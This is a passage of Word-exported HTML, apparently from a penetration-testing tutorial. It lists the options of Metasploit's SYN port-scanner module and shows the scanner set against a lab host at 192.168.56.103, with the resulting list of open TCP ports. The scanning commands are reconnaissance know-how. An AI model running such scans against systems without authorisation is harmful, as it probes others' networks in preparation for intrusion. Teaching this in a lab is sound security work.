<div class="Section254" ><p class=MsoNormal  style="margin-top:3.9000pt;margin-right:22.5500pt;margin-left:8.0000pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >BATCHSIZE</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >256</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >yes</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >The number of hosts</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >to scan</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:303.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >per set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:72.9500pt;margin-left:8.0000pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >INTERFACE</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >no</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >The name of</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >the interface</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:15.3500pt;margin-left:8.0000pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PORTS</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >1-10000</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >yes</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Ports to scan (e.g.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.9000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >22- 25,80,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:303.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >110-900)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >RHOSTS</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >yes</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >The target address</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >range</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >or</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:22.5500pt;margin-left:29.5500pt;text-indent:273.4000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >CIDR identifier SNAPLEN</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >65535</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >yes</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >The number of bytes</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >to</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >capture</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:8.1500pt;margin-left:303.0000pt;text-indent:-273.4500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >THREADS</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >yes</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >The number of</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.0000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >concurrent threads</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.3000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >TIMEOUT</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >500</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >yes</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >The reply read</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >timeout</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >in</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:303.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >milliseconds</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:114.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf auxiliary(syn) &#62; set RHOSTS 192.168.56.103 RHOSTS =&#62; 192.168.56.103</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf auxiliary(syn) &#62; exploit</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><table class=MsoNormalTable  border=0  cellspacing=0  style="border-collapse:collapse;width:242.5500pt;margin-left:11.2500pt;mso-table-layout-alt:fixed;border:none;mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;" ><tr style="height:13.5000pt;" ><td width=52  valign=top  style="width:31.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[*]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.5000pt;margin-left:0.0000pt;text-align:right;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >TCP</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=60  valign=top  style="width:36.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.6000pt;margin-left:2.5500pt;text-align:center;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >OPEN</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=238  valign=top  style="width:142.8500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103:22</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=52  valign=top  style="width:31.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[*]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.5000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >TCP</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=60  valign=top  style="width:36.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.6000pt;margin-left:2.5500pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >OPEN</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=238  valign=top  style="width:142.8500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103:23</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=52  valign=top  style="width:31.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[*]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.5000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >TCP</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=60  valign=top  style="width:36.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.6000pt;margin-left:2.5500pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >OPEN</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=238  valign=top  style="width:142.8500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103:25</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=52  valign=top  style="width:31.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[*]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.5000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >TCP</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=60  valign=top  style="width:36.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.6000pt;margin-left:2.5500pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >OPEN</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=238  valign=top  style="width:142.8500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103:53</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=52  valign=top  style="width:31.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[*]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.5000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >TCP</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=60  valign=top  style="width:36.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.6000pt;margin-left:2.5500pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >OPEN</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=238  valign=top  style="width:142.8500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:3.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103:80</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=52  valign=top  style="width:31.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >[*]</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=54  valign=top  style="width:32.4000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:3.5000pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >TCP</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=60  valign=top  style="width:36.0000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=center  style="margin-right:2.6000pt;margin-left:2.5500pt;text-align:center;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >OPEN</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=238  valign=top  style="width:142.8500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  